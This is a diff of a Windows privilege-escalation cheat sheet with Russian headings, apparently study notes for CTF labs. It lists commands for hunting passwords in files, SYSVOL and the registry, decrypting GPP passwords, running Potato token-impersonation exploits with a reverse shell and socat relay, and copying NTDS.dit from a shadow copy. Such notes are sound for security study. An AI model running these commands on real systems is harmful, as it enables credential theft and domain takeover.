@@ -12,6 +12,16 @@ get-wmiobject -class win32_product
 # Поиск паролей в каталогах
 
     gci -path . -recurse -ea SilentlyContinue -Include *.ini,*.yml,*.ps1,*cfg | select-string pass
+    
+    cd C:\ & findstr /s /p /i /n /m "password" *.xml *.ini *.txt *.config *.vbs
+
+    findstr /s /p /i /n /m "password" \\ta-d.local\SYSVOL\*.xml *.ini *.txt *.config *.vbs
+    
+
+# Поиск строк в реестре
+
+reg query HKLM /f password /t REG_SZ /s | findstr /s flag
+
 
 # Проверить права
     icacls nc64.exe
@@ -133,12 +143,6 @@ wmic qfe  - перечислить патчи
 wmic logicaldisk - перечислить диски
 
 
-
-
-# Поиск строк в реестре
-
-reg query HKLM /f password /t REG_SZ /s | findstr /s flag
-
 # Run AS without terminal
 
 runas /netonly /user:domain\user command"
@@ -190,11 +194,6 @@ https://docs.microsoft.com/en-us/windows/security/identity-protection/access-con
 gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ     где edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ - зашифрованый пароль
 
 
-
-# Истоия журнала PowerShell
-
-type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
-
 # Токен имперсонейшн
 
 C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
@@ -206,23 +205,21 @@ Now, in the "local service" reverse shell you triggered, run the RoguePotato exp
 C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999
 
 
-# SeImpersonatePrivilege
-    JuicyPotato ()
+# SeImpersonatePrivilege (Potato)
+   
+    https://github.com/ohpe/juicy-potato/releases
 
-https://github.com/ohpe/juicy-potato/releases
+    http://ohpe.it/juicy-potato/CLSID/Windows_Server_2012_Datacenter/
 
-http://ohpe.it/juicy-potato/CLSID/Windows_Server_2012_Datacenter/
+    .\JuicyPotato.exe -t * -p C:\users\userpool\desktop\start.bat -l 1338 -c '{d20a3293-3341-4ae8-9aaf-8e397cb63c34}'
 
-.\JuicyPotato.exe -t * -p C:\users\userpool\desktop\start.bat -l 1338 -c '{d20a3293-3341-4ae8-9aaf-8e397cb63c34}'
+ # remoute Potato
 
+        sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.231:9999  (10.10.11.231 -сервер)
 
-     remoute Potato
+        .\RemotePotato0.exe -m 2 -s 1 -x 10.10.14.94 -p 9999        (Запускается на сервере - можноо первым он подскажет команду socat)
 
-sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.231:9999  (10.10.11.231 -сервер)
-
-.\RemotePotato0.exe -m 2 -s 1 -x 10.10.14.94 -p 9999        (Запускается на сервере - можноо первым он подскажет команду socat)
-
-    Jouice potato NG
+# Jouice potato NG
 
     https://github.com/antonioCoco/JuicyPotatoNG/releases
 
@@ -270,10 +267,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Sh
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy
 
 
-Поиск секретов
 
-
-cd C:\ & findstr /s /p /i /n /m "password" *.xml *.ini *.txt *.config *.vbs
 
 
 МИМИКАТЗ
@@ -464,11 +458,6 @@ Get-acl file | fl *
 # Enumerate specific service
 Get-CimInstance -ClassName Win32_Service -Filter "Name='mysql'" | Select-Object StartMode
 
-# Скрипты векторов повышения привелегий
-
-cd C:\ & findstr /s /p /i /n /m "password" *.xml *.ini *.txt *.config *.vbs
-
-findstr /s /p /i /n /m "password" \\ta-d.local\SYSVOL\*.xml *.ini *.txt *.config *.vbs
 
 
 
@@ -569,3 +558,4 @@ Windows VM
   Find-AdmPwdExtendedRights -Identity * (THMorg)
   runas /netonly /user:bk-admin "cmd.exe"
   Get-AdmPwdPassword -ComputerName Creds-Harvestin
+
